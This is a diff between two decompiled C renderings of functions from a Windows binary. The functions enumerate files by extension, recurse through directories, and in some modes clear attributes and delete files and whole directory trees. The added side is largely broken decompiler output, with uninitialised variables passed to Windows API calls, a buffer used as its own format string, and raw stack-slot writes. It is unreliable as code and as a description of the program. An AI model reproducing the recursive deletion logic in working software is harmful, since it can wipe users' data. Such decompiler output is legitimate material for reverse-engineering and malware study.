     // 0x403bde
-    function_401f45((char *)&v3, 5);
+    v5 = (struct _NETRESOURCEA *)&v7;
+    function_401f45(&v7, 5);
     g4 = 5;
-    int32_t * hFindFile = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)mem); // 0x403bff
-    int32_t v6; // bp-12
-    if (hFindFile == (int32_t *)-1) {
+    v5 = (struct _NETRESOURCEA *)&str;
+    int32_t * v12 = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)mem); // 0x403bff
+    int32_t v13 = (int32_t)v12; // 0x403bff
+    if (v12 == (int32_t *)-1) {
         // 0x403c0d
-        strcpy((char *)(result + 44), g16);
-        function_402830(result, 320, (char *)mem, (int32_t)&v6);
-        function_401e99((char *)mem, 320);
+        strcpy((char *)(result + 44), g17);
+        function_402830(result, 320, (char *)mem, (int32_t)&hFindFile);
+        function_401e99(result, 320);
         free(mem);
+        v8 = v6;
         // branch -> 0x403cbd
         // 0x403cbd
-        return (int32_t)&v5;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
+        return (int32_t)&v11;
     }
-    int32_t v7 = function_403dda((char *)mem); // 0x403c40
-    g4 = (int32_t)mem;
-    int32_t v8; // bp-16
-    if (v7 != 0) {
+    // 0x403c3f
+    int32_t v14; // bp-16
+    if (function_403dda((char *)mem) != 0) {
         // 0x403c4a
-        function_402830(result, 320, (char *)mem, (int32_t)&v8);
-        if (function_401e99((char *)mem, 320) == 0) {
+        function_402830(result, 320, (char *)mem, (int32_t)&v14);
+        if (function_401e99(result, 320) == 0) {
             // 0x403cb5
-            free(mem);
+            *(int32_t *)(v6 - 4) = result;
+            free((int32_t *)hFindFile);
+            v10 = g8;
+            g4 = *(int32_t *)v10;
+            v8 = v10 + 4;
             // branch -> 0x403cbd
             // 0x403cbd
-            return (int32_t)&v5;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
+            return (int32_t)&v11;
         }
     }
     // 0x403c69
-    v6 = 0;
-    int32_t v9 = g6 - 1; // 0x403c6d
-    g3 = v9;
-    if (v9 < 1) {
+    hFindFile = 0;
+    int32_t v15 = g7 - 1; // 0x403c6d
+    if (v15 < 1) {
         // 0x403cac
-        FindClose(hFindFile);
+        *(int32_t *)(v6 - 4) = v13;
+        FindClose((int32_t *)hFindFile);
         // branch -> 0x403cb5
         // 0x403cb5
-        free(mem);
+        *(int32_t *)(g8 - 4) = result;
+        free((int32_t *)hFindFile);
+        v10 = g8;
+        g4 = *(int32_t *)v10;
+        v8 = v10 + 4;
         // branch -> 0x403cbd
     } else {
-        // 0x403c74
+        int32_t v16 = v6; // 0x403c74
         // branch -> 0x403c74
+        int32_t v17; // 0x403ca0
         while (true) {
-            int32_t v10 = function_403cd5(hFindFile, result); // 0x403c78
-            g4 = (int32_t)mem;
-            if (v10 != -1) {
+            // 0x403c74
+            *(int32_t *)(v16 - 4) = result;
+            *(int32_t *)(v16 - 8) = v13;
+            int32_t v18 = function_403cd5(); // 0x403c78
+            int32_t v19 = g8 + 8; // 0x403cc2
+            if (v18 != -1) {
                 // 0x403c84
-                v6 += v10;
-                int32_t v11 = 320 * v10; // 0x403c8d
-                g6 = v11;
-                function_402830(result, v11, (char *)mem, (int32_t)&v8);
-                if (function_401e99((char *)mem, g6) != 0) {
+                hFindFile += v18;
+                g7 = 320 * v18;
+                *(int32_t *)(g8 + 4) = (int32_t)&v14;
+                *(int32_t *)g8 = result;
+                *(int32_t *)(g8 - 4) = g7;
+                *(int32_t *)(g8 - 8) = result;
+                function_402830(hFindFile, v13, (char *)v1, 0);
+                *(int32_t *)(g8 - 4) = g7;
+                *(int32_t *)(g8 - 8) = result;
+                int32_t v20 = function_401e99(hFindFile, v13); // 0x403c9b
+                v17 = g8 + 24;
+                if (v20 != 0) {
                     // 0x403ca7
-                    if (v6 >= v9) {
+                    if (hFindFile >= v15) {
                         // break -> 0x403cac
                         break;
                     }
+                    v16 = v17;
                     // continue -> 0x403c74
                     continue;
+                } else {
+                    v19 = v17;
                 }
             }
             // 0x403cc2
-            free(mem);
-            int32_t result2 = FindClose(hFindFile); // 0x403ccd
+            *(int32_t *)(v19 - 4) = result;
+            free((int32_t *)hFindFile);
+            int32_t * v21 = (int32_t *)g8; // 0x403cc9
+            g4 = *v21;
+            *v21 = v13;
+            int32_t result2 = FindClose((int32_t *)hFindFile); // 0x403ccd
+            v8 = g8;
             // branch -> 0x403cbd
             // 0x403cbd
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return result2;
         }
         // 0x403cac
-        FindClose(hFindFile);
+        *(int32_t *)(v17 - 4) = v13;
+        FindClose((int32_t *)hFindFile);
         // branch -> 0x403cb5
         // 0x403cb5
-        free(mem);
+        *(int32_t *)(g8 - 4) = result;
+        free((int32_t *)hFindFile);
+        v10 = g8;
+        g4 = *(int32_t *)v10;
+        v8 = v10 + 4;
         // branch -> 0x403cbd
     }
     // 0x403cbd
-    return (int32_t)&v5;
+    g7 = *(int32_t *)(v8 + 4);
+    g3 = *(int32_t *)(v8 + 8);
+    g2 = v1;
+    return (int32_t)&v11;
 }
 
-// Address range: 0x403cd5 - 0x403d20
-int32_t function_403cd5(int32_t * hFindFile, int32_t lpFindFileData) {
-    int32_t v1 = g5; // 0x403cdd
-    g5 = lpFindFileData;
+// Address range: 0x403cd5 - 0x403d21
+int32_t function_403cd5(void) {
+    // 0x403cd5
     g3 = 0;
-    if (!FindNextFileA(hFindFile, (struct _WIN32_FIND_DATAA *)lpFindFileData)) {
-        // 0x403ce9
+    int32_t v1;
+    struct _WIN32_FIND_DATAA * lpFindFileData = (struct _WIN32_FIND_DATAA *)v1; // 0x403ce4
+    int32_t hFindFile;
+    if (!FindNextFileA((int32_t *)hFindFile, lpFindFileData)) {
+        // 0x403d1b
         // branch -> 0x403d1d
     } else {
         while (true) {
             // 0x403cef
-            if (g24 != 0) {
+            if (g26 != 0) {
                 // 0x403d16
                 // branch -> 0x403d1d
                 // 0x403d1d
-                g5 = v1;
                 return -1;
             }
-            int32_t v2 = g5; // 0x403cf8
-            int32_t v3 = function_403dda((char *)v2); // 0x403cf9
-            g4 = v2;
-            int32_t v4 = g3;
-            int32_t result = v4; // 0x403d0a
-            if (v3 != 0) {
-                int32_t v5 = v4 + 1; // 0x403d03
+            // 0x403cf8
+            *(int32_t *)(g8 - 4) = g5;
+            int32_t hFindFile2 = 0; // bp-20
+            int32_t v2 = function_403dda((char *)hFindFile2); // 0x403cf9
+            int32_t v3 = g3;
+            int32_t v4 = v3; // 0x403d0a
+            if (v2 != 0) {
+                int32_t v5 = v3 + 1; // 0x403d03
                 g3 = v5;
                 g5 += 320;
-                result = v5;
+                v4 = v5;
                 // branch -> 0x403d0a
             }
             // 0x403d0a
-            if (result < 100) {
+            if (v4 < 100) {
                 // 0x403d0f
-                if (!FindNextFileA(hFindFile, (struct _WIN32_FIND_DATAA *)g5)) {
-                    // break -> 0x403ce9
+                *(int32_t *)g8 = g5;
+                *(int32_t *)(g8 - 4) = *(int32_t *)(g8 + 20);
+                if (!FindNextFileA((int32_t *)hFindFile2, lpFindFileData)) {
+                    // break -> 0x403d1b
                     break;
                 }
                 // continue -> 0x403cef
                 continue;
             }
+            // 0x403d1b
+            // branch -> 0x403d1d
             // 0x403d1d
-            g5 = v1;
-            return result;
+            return g3;
         }
-        // 0x403ce9
+        // 0x403d1b
         // branch -> 0x403d1d
     }
     // 0x403d1d
-    g5 = v1;
     return g3;
 }
 
-// Address range: 0x403d21 - 0x403d8c
+// Address range: 0x403d21 - 0x403d8d
 int32_t function_403d21(char * lpFileName) {
-    int32_t v1 = g5; // 0x403d31
-    int32_t lpFindFileData = 0; // bp-324
+    // 0x403d21
+    int32_t lpFindFileData; // bp-324
+    int32_t v1 = &lpFindFileData; // 0x403d24
+    char * hFindFile = NULL; // bp-340
+    *(int32_t *)&hFindFile = (int32_t)lpFileName;
     g5 = 0;
-    int32_t * v2 = FindFirstFileA(lpFileName, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x403d38
-    g6 = (int32_t)v2;
     int32_t result; // 0x403d87
-    if (v2 == (int32_t *)-1) {
+    if (FindFirstFileA(lpFileName, (struct _WIN32_FIND_DATAA *)&lpFindFileData) == (int32_t *)-1) {
         // 0x403d87
         result = g5;
         // branch -> 0x403d89
     } else {
-        // 0x403d45
-        // branch -> 0x403d45
         while (true) {
-            int32_t v3 = function_403dda((char *)&lpFindFileData); // 0x403d4c
-            g4 = &lpFindFileData;
-            if (v3 != 0) {
+            // 0x403d45
+            *(int32_t *)(g8 - 4) = v1;
+            int32_t v2 = function_403dda(hFindFile); // 0x403d4c
+            int32_t * v3 = (int32_t *)g8; // 0x403d53
+            if (v2 != 0) {
                 // 0x403d56
                 g5++;
                 // branch -> 0x403d57
             }
             // 0x403d57
-            if (g24 != 0) {
+            if (g26 != 0) {
                 // 0x403d74
-                FindClose(&((struct _WIN32_FIND_DATAA *)g6)->e0);
+                *v3 = g7;
+                FindClose((int32_t *)hFindFile);
                 // branch -> 0x403d89
                 // 0x403d89
-                g5 = v1;
+                g5 = *(int32_t *)g8;
                 return -1;
             }
             // 0x403d60
-            if (!FindNextFileA((int32_t *)g6, (struct _WIN32_FIND_DATAA *)&lpFindFileData)) {
+            *v3 = v1;
+            *(int32_t *)(g8 - 4) = g7;
+            if (!FindNextFileA((int32_t *)hFindFile, (struct _WIN32_FIND_DATAA *)&lpFindFileData)) {
                 // break -> 0x403d80
                 break;
             }
             // continue -> 0x403d45
         }
         // 0x403d80
-        FindClose(&((struct _WIN32_FIND_DATAA *)g6)->e0);
+        *(int32_t *)(g8 - 4) = g7;
+        FindClose((int32_t *)hFindFile);
         // branch -> 0x403d87
         // 0x403d87
         // branch -> 0x403d89
     }
     // 0x403d89
-    g5 = v1;
+    g5 = *(int32_t *)g8;
     return result;
 }
 
-// Address range: 0x403d8d - 0x403dd9
+// Address range: 0x403d8d - 0x403dda
 int32_t function_403d8d(int32_t a1) {
     // 0x403d8d
-    g55 = 0;
-    int32_t v1 = g6; // bp-4
+    g58 = 0;
     if (a1 == 0) {
         // 0x403dd8
         return g1;
     }
+    char * str = (char *)g5; // bp-8
+    int32_t v1 = (int32_t)&str; // 0x403da1
     // branch -> 0x403d9e
+    int32_t v2;
     while (true) {
-        int32_t str = a1 + 1; // 0x403d9e
-        int32_t v2 = str; // edi
-        char * found_char_pos = strchr((char *)str, 59); // 0x403da4
+        int32_t v3 = a1 + 1; // edi
+        *(int32_t *)(v1 - 4) = 59;
+        *(int32_t *)(v1 - 8) = v3;
+        char * found_char_pos = strchr(str, g7); // 0x403da4
+        int32_t v4 = g8 + 8; // 0x403db5
         if (found_char_pos != NULL) {
             // 0x403db2
             *found_char_pos = 0;
+            v4 = g8;
             // branch -> 0x403db5
         }
-        int32_t str2 = v2; // 0x403db5
-        int32_t len = strlen((char *)str2); // 0x403db6
+        // 0x403db5
+        *(int32_t *)(v4 - 4) = v3;
+        int32_t len = strlen(str); // 0x403db6
         g1 = len;
-        g4 = str2;
+        g4 = *(int32_t *)g8;
+        v2 = g8 + 4;
         if (len >= 2) {
-            int32_t v3 = g55; // 0x403dc1
-            g1 = v3;
-            g55 = v3 + 1;
-            *(int32_t *)(4 * v3 + (int32_t)&g56) = v2;
+            int32_t v5 = g58; // 0x403dc1
+            g1 = v5;
+            g58 = v5 + 1;
+            *(int32_t *)(4 * v5 + (int32_t)&g59) = v3;
+            v2 = g8;
             // branch -> 0x403dd3
         }
-        int32_t v4 = (int32_t)found_char_pos; // 0x403dd3
-        if (v4 == 0) {
+        int32_t v6 = (int32_t)found_char_pos; // 0x403dd3
+        if (v6 == 0) {
             // break -> 0x403dd7
             break;
         }
-        a1 = v4;
+        v1 = v2;
+        a1 = v6;
         // continue -> 0x403d9e
     }
     // 0x403dd7
+    g5 = *(int32_t *)v2;
     // branch -> 0x403dd8
     // 0x403dd8
-    g6 = v1;
     return g1;
 }
 
-// Address range: 0x403dda - 0x4047d1
+// Address range: 0x403dda - 0x403e89
 int32_t function_403dda(char * a1) {
-    int32_t v1 = g5; // 0x403dde
+    int32_t v1 = g5; // bp-20
+    int32_t v2 = &v1; // 0x403dde
+    int32_t v3; // 0x403e7e
     int32_t result; // 0x403e83
+    int32_t v4; // 0x403e84
     if ((*a1 & 16) != 0) {
+        v4 = v2;
         // 0x403e84
+        *(int32_t *)(v4 - 4) = 1;
+        v3 = v4;
         result = 1;
         // branch -> 0x403e7e
     } else {
         int32_t str = (int32_t)a1 + 44; // 0x403dec
         char * found_char_pos = strrchr((char *)str, 46); // 0x403df2
-        if (g55 >= 1) {
-            int32_t lpString1 = &g56; // esi
-            int32_t str2 = &g56; // 0x403e17
-            char * v2 = NULL;
+        if (g58 > 0) {
+            int32_t v5 = &g59; // esi
+            int32_t v6 = v2; // 0x403e17
+            int32_t v7 = &g59; // 0x403e17
             // branch -> 0x403e17
             while (true) {
                 // 0x403e17
-                if (strlen((char *)*(int32_t *)str2) >= 2) {
+                *(int32_t *)(v6 - 4) = *(int32_t *)v7;
+                int32_t v8; // 0x403e69
+                if (strlen(found_char_pos) >= 2) {
                     // 0x403e24
-                    if (lstrcmpiA((char *)*(int32_t *)lpString1, "*.*") != 0) {
-                        // 0x403e31
-                        int32_t lpString1_;
-                        char * lpString2; // 0x403e63
-                        if (found_char_pos == NULL) {
-                            // 0x403e5c
-                            lpString2 = "*.";
-                            lpString1_ = *(int32_t *)lpString1;
-                            // branch -> 0x403e63
-                          lab_0x403e63:
-                            // 0x403e63
-                            if (lstrcmpiA((char *)lpString1_, lpString2) != 0) {
-                                goto lab_0x403e69;
-                            }
-                            // 0x403e84
-                            // branch -> 0x403e7e
-                            // 0x403e7e
-                            g5 = v1;
-                            return 1;
-                        }
-                        int32_t len = strlen((char *)(*(int32_t *)lpString1 + 2)); // 0x403e3d
+                    *(int32_t *)g8 = (int32_t)"*.*";
+                    *(int32_t *)(g8 - 4) = *(int32_t *)v5;
+                    int32_t * lpString2;
+                    if (lstrcmpiA(found_char_pos, (char *)&lpString2) == 0) {
+                        // 0x403e84
+                        v4 = g8;
+                        // branch -> 0x403e84
+                        // 0x403e84
+                        *(int32_t *)(v4 - 4) = 1;
+                        v3 = v4;
+                        // branch -> 0x403e7e
+                        // 0x403e7e
+                        g5 = *(int32_t *)v3;
+                        g7 = *(int32_t *)(v3 + 4);
+                        g2 = *(int32_t *)(v3 + 8);
+                        g3 = *(int32_t *)(v3 + 12);
+                        return 1;
+                    }
+                    // 0x403e31
+                    if (*(int32_t *)(g8 + 16) == 0) {
+                        // 0x403e5c
+                        *(int32_t *)(g8 - 4) = (int32_t)"*.";
+                        *(int32_t *)(g8 - 8) = *(int32_t *)v5;
+                        // branch -> 0x403e63
+                    } else {
+                        // 0x403e38
+                        *(int32_t *)(g8 - 4) = *(int32_t *)v5 + 2;
+                        int32_t len = strlen(found_char_pos); // 0x403e3d
                         if (len == 0) {
                             // 0x403e7c
+                            v3 = g8 + 4;
                             // branch -> 0x403e7e
                             // 0x403e7e
-                            g5 = v1;
+                            g5 = *(int32_t *)v3;
+                            g7 = *(int32_t *)(v3 + 4);
+                            g2 = *(int32_t *)(v3 + 8);
+                            g3 = *(int32_t *)(v3 + 12);
                             return 0;
                         }
-                        int32_t len2 = strlen((char *)str); // 0x403e4a
-                        lpString2 = (char *)(*(int32_t *)lpString1 + 2);
-                        lpString1_ = str + len2 - len;
+                        // 0x403e49
+                        *(int32_t *)g8 = str;
+                        int32_t v9 = strlen(found_char_pos) - len; // 0x403e50
+                        *(int32_t *)g8 = *(int32_t *)v5 + 2;
+                        *(int32_t *)(g8 - 4) = str + v9;
                         // branch -> 0x403e63
+                        // 0x403e63
+                        if (lstrcmpiA(found_char_pos, (char *)&lpString2) == 0) {
+                            // 0x403e84
+                            v4 = g8;
+                            // branch -> 0x403e84
+                            // 0x403e84
+                            *(int32_t *)(v4 - 4) = 1;
+                            v3 = v4;
+                            // branch -> 0x403e7e
+                            // 0x403e7e
+                            g5 = *(int32_t *)v3;
+                            g7 = *(int32_t *)(v3 + 4);
+                            g2 = *(int32_t *)(v3 + 8);
+                            g3 = *(int32_t *)(v3 + 12);
+                            return 1;
+                        }
+                      lab_0x403e63:
+                        // 0x403e63
+                        v8 = g8;
+                        // branch -> 0x403e69
+                        goto lab_0x403e69;
+                    }
+                    // 0x403e63
+                    if (lstrcmpiA(found_char_pos, (char *)&lpString2) != 0) {
                         goto lab_0x403e63;
                     }
                     // 0x403e84
+                    v4 = g8;
+                    // branch -> 0x403e84
+                    // 0x403e84
+                    *(int32_t *)(v4 - 4) = 1;
+                    v3 = v4;
                     // branch -> 0x403e7e
                     // 0x403e7e
-                    g5 = v1;
+                    g5 = *(int32_t *)v3;
+                    g7 = *(int32_t *)(v3 + 4);
+                    g2 = *(int32_t *)(v3 + 8);
+                    g3 = *(int32_t *)(v3 + 12);
                     return 1;
                 }
+                v8 = g8 + 4;
               lab_0x403e69:;
-                uint32_t v3 = (int32_t)v2 + 1; // 0x403e69
-                int32_t v4 = lpString1 + 4; // 0x403e6d
-                lpString1 = v4;
-                if (v3 >= g55) {
+                int32_t * v10 = (int32_t *)(v8 + 24); // 0x403e69
+                *v10 = *v10 + 1;
+                int32_t v11 = v5 + 4; // 0x403e6d
+                v5 = v11;
+                if (*(int32_t *)(g8 + 24) >= g58) {
                     // break -> 0x403e7c
                     break;
                 }
-                str2 = v4;
-                v2 = (char *)v3;
+                v6 = g8;
+                v7 = v11;
                 // continue -> 0x403e17
             }
             // 0x403e7c
+            v3 = g8;
             // branch -> 0x403e7e
             // 0x403e7e
-            g5 = v1;
+            g5 = *(int32_t *)v3;
+            g7 = *(int32_t *)(v3 + 4);
+            g2 = *(int32_t *)(v3 + 8);
+            g3 = *(int32_t *)(v3 + 12);
             return 0;
         }
         // 0x403e7c
+        v3 = v2;
         result = 0;
         // branch -> 0x403e7e
     }
     // 0x403e7e
-    g5 = v1;
+    g5 = *(int32_t *)v3;
+    g7 = *(int32_t *)(v3 + 4);
+    g2 = *(int32_t *)(v3 + 8);
+    g3 = *(int32_t *)(v3 + 12);
     return result;
 }
 
-// Address range: 0x4047d2 - 0x404888
-int32_t function_4047d2(struct _FILETIME * lpFileName) {
+// Address range: 0x403e89 - 0x403eae
+int32_t function_403e89(int32_t a1) {
+    int32_t v1 = 82; // bp-12
+    int32_t result = function_401f45((char *)&v1, 6); // 0x403ea5
+    g4 = 6;
+    return result;
+}
+
+// Address range: 0x403eae - 0x4040c4
+int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2) {
+    struct _WIN32_FIND_DATAA * lpFindFileData2 = (struct _WIN32_FIND_DATAA *)g2; // bp-4
+    g2 = (int32_t)&lpFindFileData2;
+    int32_t v1; // 0x4040bf
+    int32_t result; // 0x4040c3
+    if (g26 != 0) {
+        // 0x4040b8
+        v1 = g8;
+        result = 0;
+        // branch -> 0x4040bf
+    } else {
+        int32_t v2 = (int32_t)a1;
+        g7 = *(int32_t *)0x406180;
+        int32_t str = 0; // bp-2120
+        sprintf((char *)&str, "%s\\*.*", a1);
+        char lpFindFileData; // bp-328
+        int32_t v3 = &lpFindFileData; // 0x403ee1
+        int32_t * hFindFile = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x403eef
+        int32_t v4 = (int32_t)hFindFile; // 0x403eef
+        int32_t v5; // 0x4040bc
+        int32_t v6;
+        if (hFindFile == (int32_t *)-1) {
+            // 0x403ec7
+            v6 = a2 - 76;
+            // branch -> 0x4040a5
+        } else {
+            // 0x403f01
+            g5 = *(int32_t *)0x4060f0;
+            g3 = 258;
+            int32_t v7; // bp-1096
+            int32_t v8 = &v7; // 0x403f34
+            int32_t v9; // bp-840
+            int32_t v10 = &v9; // 0x403fbd
+            int32_t v11 = a2 - 76; // 0x403fc9
+            int32_t v12; // bp-1608
+            int32_t v13 = &v12; // 0x403f5a
+            *(int32_t *)(g8 - 4) = v3;
+            *(int32_t *)(g8 - 8) = v4;
+            if (FindNextFileA(hFindFile, lpFindFileData2)) {
+                while (true) {
+                    // 0x403f24
+                    char v14; // bp-284
+                    int32_t v15; // 0x403f12
+                    if (v14 != 46) {
+                        // 0x403f2d
+                        *(int32_t *)(g8 - 4) = (int32_t)&v14;
+                        *(int32_t *)(g8 - 8) = v8;
+                        strcpy((char *)hFindFile, (char *)lpFindFileData2);
+                        int32_t * v16 = (int32_t *)(g8 + 4); // 0x403f4e
+                        g4 = *v16;
+                        *v16 = v8;
+                        *(int32_t *)g8 = v2;
+                        *(int32_t *)(g8 - 4) = (int32_t)"%s\\%s";
+                        int32_t * str2;
+                        if ((lpFindFileData & 16) != 0) {
+                            // 0x403f5a
+                            *(int32_t *)(g8 - 8) = v13;
+                            sprintf((char *)&str2, (char *)&str2);
+                            int32_t v17 = g8 + 16; // 0x403f63
+                            int32_t v18 = v17; // 0x403f9f
+                            int32_t v19; // 0x403fa9
+                            if (a2 >= 78) {
+                                // 0x403f6c
+                                if (a2 <= 79) {
+                                    // 0x403f72
+                                    *(int32_t *)(g8 + 12) = 70;
+                                    *(int32_t *)(g8 + 8) = v13;
+                                    int32_t v20 = function_404354((char *)hFindFile, (int32_t)lpFindFileData2); // 0x403f7b
+                                    int32_t * v21 = (int32_t *)(g8 + 4); // 0x403f83
+                                    g4 = *v21;
+                                    if (v20 != 0) {
+                                        // 0x403f8a
+                                        *v21 = 0xea60;
+                                        *(int32_t *)g8 = g22;
+                                        if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
+                                            // 0x403f8a
+                                            v18 = g8;
+                                            // branch -> 0x403f9f
+                                            // 0x403f9f
+                                            *(int32_t *)(v18 - 4) = a2;
+                                            *(int32_t *)(v18 - 8) = v13;
+                                            v19 = function_403eae((struct _WIN32_FIND_DATAA *)hFindFile, (int32_t)lpFindFileData2);
+                                            g4 = *(int32_t *)(g8 + 4);
+                                            if (v19 != 0) {
+                                                goto lab_0x403f0c_3;
+                                            }
+                                            // 0x404091
+                                            *(int32_t *)(g8 - 4) = v4;
+                                            FindClose(hFindFile);
+                                            // branch -> 0x4040b8
+                                            // 0x4040b8
+                                            v1 = g8;
+                                            // branch -> 0x4040bf
+                                            // 0x4040bf
+                                            g5 = *(int32_t *)v1;
+                                            g7 = *(int32_t *)(v1 + 4);
+                                            g3 = *(int32_t *)(v1 + 8);
+                                            g2 = (int32_t)lpFindFileData2;
+                                            return 0;
+                                        }
+                                    }
+                                    // 0x404091
+                                    *(int32_t *)(g8 - 4) = v4;
+                                    FindClose(hFindFile);
+                                    // branch -> 0x4040b8
+                                    // 0x4040b8
+                                    v1 = g8;
+                                    // branch -> 0x4040bf
+                                    // 0x4040bf
+                                    g5 = *(int32_t *)v1;
+                                    g7 = *(int32_t *)(v1 + 4);
+                                    g3 = *(int32_t *)(v1 + 8);
+                                    g2 = (int32_t)lpFindFileData2;
+                                    return 0;
+                                }
+                                v18 = v17;
+                            }
+                            // 0x403f9f
+                            *(int32_t *)(v18 - 4) = a2;
+                            *(int32_t *)(v18 - 8) = v13;
+                            v19 = function_403eae((struct _WIN32_FIND_DATAA *)hFindFile, (int32_t)lpFindFileData2);
+                            g4 = *(int32_t *)(g8 + 4);
+                            if (v19 != 0) {
+                                goto lab_0x403f0c_3;
+                            }
+                            // 0x404091
+                            *(int32_t *)(g8 - 4) = v4;
+                            FindClose(hFindFile);
+                            // branch -> 0x4040b8
+                            // 0x4040b8
+                            v1 = g8;
+                            // branch -> 0x4040bf
+                            // 0x4040bf
+                            g5 = *(int32_t *)v1;
+                            g7 = *(int32_t *)(v1 + 4);
+                            g3 = *(int32_t *)(v1 + 8);
+                            g2 = (int32_t)lpFindFileData2;
+                            return 0;
+                        }
+                        // 0x403fbd
+                        *(int32_t *)(g8 - 8) = v10;
+                        sprintf((char *)&str2, (char *)&str2);
+                        int32_t v22; // 0x404076
+                        if (v11 == 0) {
+                            v22 = g8 + 16;
+                          lab_0x404070:
+                            // 0x404070
+                            *(int32_t *)(v22 - 4) = 0;
+                            *(int32_t *)(v22 - 8) = v10;
+                            SetFileAttributesA((char *)hFindFile, (int32_t)lpFindFileData2);
+                            *(int32_t *)(g8 - 4) = v10;
+                            DeleteFileA((char *)hFindFile);
+                            // branch -> 0x403f0c
+                        } else {
+                            // 0x403fd3
+                            if (a2 > 77) {
+                                // 0x403fdd
+                                if (a2 <= 79) {
+                                    // 0x40401c
+                                    *(int32_t *)(g8 + 12) = 68;
+                                    *(int32_t *)(g8 + 8) = v10;
+                                    int32_t v23 = function_404354((char *)hFindFile, (int32_t)lpFindFileData2); // 0x404025
+                                    int32_t * v24 = (int32_t *)(g8 + 4); // 0x40402d
+                                    g4 = *v24;
+                                    if (v23 != 0) {
+                                        // 0x404030
+                                        *v24 = 0xea60;
+                                        *(int32_t *)g8 = g22;
+                                        if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
+                                            // 0x404041
+                                            *(int32_t *)(g8 - 4) = v10;
+                                            *(int32_t *)(g8 - 8) = 0;
+                                            int32_t v25 = function_40439c(hFindFile, (int32_t)lpFindFileData2); // 0x40404a
+                                            int32_t * v26 = (int32_t *)(g8 + 4); // 0x404052
+                                            g4 = *v26;
+                                            if (v25 != 0) {
+                                                // 0x404055
+                                                *v26 = 0xea60;
+                                                *(int32_t *)g8 = g22;
+                                                if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
+                                                    // 0x404066
+                                                    if (a2 != 79) {
+                                                        goto lab_0x403f0c;
+                                                    }
+                                                    // 0x404066
+                                                    v22 = g8;
+                                                    // branch -> 0x404070
+                                                    goto lab_0x404070;
+                                                }
+                                            }
+                                        }
+                                    }
+                                    // 0x404091
+                                    *(int32_t *)(g8 - 4) = v4;
+                                    FindClose(hFindFile);
+                                    // branch -> 0x4040b8
+                                    // 0x4040b8
+                                    v1 = g8;
+                                    // branch -> 0x4040bf
+                                    // 0x4040bf
+                                    g5 = *(int32_t *)v1;
+                                    g7 = *(int32_t *)(v1 + 4);
+                                    g3 = *(int32_t *)(v1 + 8);
+                                    g2 = (int32_t)lpFindFileData2;
+                                    return 0;
+                                }
+                                // 0x403fe3
+                                if (a2 == 89) {
+                                    // 0x403fed
+                                    *(int32_t *)(g8 + 12) = v3;
+                                    int32_t v27 = function_403dda((char *)hFindFile); // 0x403ff4
+                                    int32_t * v28 = (int32_t *)g8; // 0x403ffb
+                                    g4 = *v28;
+                                    if (v27 != 0) {
+                                        // 0x404002
+                                        *v28 = v3;
+                                        *(int32_t *)(g8 - 4) = v10;
+                                        function_4045cb();
+                                        g4 = *(int32_t *)(g8 + 4);
+                                        // branch -> 0x403f0c
+                                    }
+                                }
+                              lab_0x403f0c:
+                                // 0x403f0c
+                                v15 = g8;
+                                *(int32_t *)(v15 - 4) = v3;
+                                *(int32_t *)(v15 - 8) = v4;
+                                if (!FindNextFileA(hFindFile, lpFindFileData2)) {
+                                    // break -> 0x40409c
+                                    break;
+                                }
+                                // continue -> 0x403f24
+                                continue;
+                            }
+                        }
+                      lab_0x403f0c_3:
+                        // 0x403f0c
+                        v15 = g8;
+                        *(int32_t *)(v15 - 4) = v3;
+                        *(int32_t *)(v15 - 8) = v4;
+                        if (!FindNextFileA(hFindFile, lpFindFileData2)) {
+                            // break -> 0x40409c
+                            break;
+                        }
+                        // continue -> 0x403f24
+                        continue;
+                    }
+                    // 0x403f0c
+                    v15 = g8;
+                    *(int32_t *)(v15 - 4) = v3;
+                    *(int32_t *)(v15 - 8) = v4;
+                    if (!FindNextFileA(hFindFile, lpFindFileData2)) {
+                        // break -> 0x40409c
+                        break;
+                    }
+                    // continue -> 0x403f24
+                }
+                // 0x40409c
+                *(int32_t *)(g8 - 4) = v4;
+                FindClose(hFindFile);
+                // branch -> 0x4040a5
+                // 0x4040a5
+                if (v11 == 0) {
+                    // 0x4040ab
+                    *(int32_t *)(g8 - 4) = v2;
+                    if (!RemoveDirectoryA((char *)hFindFile)) {
+                        // 0x4040b8
+                        v1 = g8;
+                        // branch -> 0x4040bf
+                        // 0x4040bf
+                        g5 = *(int32_t *)v1;
+                        g7 = *(int32_t *)(v1 + 4);
+                        g3 = *(int32_t *)(v1 + 8);
+                        g2 = (int32_t)lpFindFileData2;
+                        return 0;
+                    }
+                }
+                // 0x4040bc
+                v5 = g8;
+                *(int32_t *)(v5 - 4) = 1;
+                v1 = v5;
+                // branch -> 0x4040bf
+                // 0x4040bf
+                g5 = *(int32_t *)v1;
+                g7 = *(int32_t *)(v1 + 4);
+                g3 = *(int32_t *)(v1 + 8);
+                g2 = (int32_t)lpFindFileData2;
+                return 1;
+            }
+            // 0x40409c
+            *(int32_t *)(g8 - 4) = v4;
+            FindClose(hFindFile);
+            v6 = v11;
+            // branch -> 0x4040a5
+        }
+        // 0x4040a5
+        if (v6 == 0) {
+            // 0x4040ab
+            *(int32_t *)(g8 - 4) = v2;
+            if (!RemoveDirectoryA((char *)hFindFile)) {
+                // 0x4040b8
+                v1 = g8;
+                // branch -> 0x4040bf
+                // 0x4040bf
+                g5 = *(int32_t *)v1;
+                g7 = *(int32_t *)(v1 + 4);
+                g3 = *(int32_t *)(v1 + 8);
+                g2 = (int32_t)lpFindFileData2;
+                return 0;
+            }
+        }
+        // 0x4040bc
+        v5 = g8;
+        *(int32_t *)(v5 - 4) = 1;
+        v1 = v5;
+        result = 1;
+        // branch -> 0x4040bf
+    }
+    // 0x4040bf
+    g5 = *(int32_t *)v1;
+    g7 = *(int32_t *)(v1 + 4);
+    g3 = *(int32_t *)(v1 + 8);
